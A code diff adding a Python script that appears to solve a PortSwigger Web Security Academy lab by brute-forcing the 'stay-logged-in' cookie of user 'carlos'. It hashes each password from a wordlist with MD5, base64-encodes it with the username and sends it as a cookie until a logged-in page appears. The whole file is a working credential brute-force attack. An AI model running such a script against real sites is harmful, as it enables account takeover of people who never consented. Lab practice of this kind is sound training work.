@@ -1,0 +1,38 @@
+import requests # Import the requests module to send requests
+import hashlib # Import hashlib to hash the password
+import base64 # Import base64 to encode the password
+
+def start():
+    labID = "LabID_HERE" # Change this with your lab ID for portswigger
+    url = f'https://{labID}.web-security-academy.net/my-account?id=carlos' # URL for the target site
+    password_list = r'PASSWORDS_HERE' # Change this with your passwords wordlist file path
+    
+    with open(password_list, 'r') as file: # Change this with your passwords wordlist file path
+        credential = file.readlines()
+
+    credential = [i.strip() for i in credential] # Remove any whitespace or newline characters
+    
+    for i in credential:
+        # Generate MD5 hash of the password
+        hashed_password = hashlib.md5(i.encode()).hexdigest()
+        
+        # Encode 'carlos' username in base64 with the hashed password
+        password = base64.b64encode(f'carlos:{hashed_password}'.encode()).decode()
+        
+        # Create headers with the encoded password
+        headers = {
+            'Cookie': 'stay-logged-in=' + password
+            }
+        
+        # Send POST request
+        with requests.post(url, headers=headers) as req:
+            response_content = req.text # Get the response content
+        
+        # Check if the response contains any success message
+        if 'Your username is:' in response_content:            
+            print(f'## {i} ==> Succeeded! ##')
+            return  # Exit once credentials are found
+        else:            
+            print(f'- {i} ==> Invalid')
+            
+start()
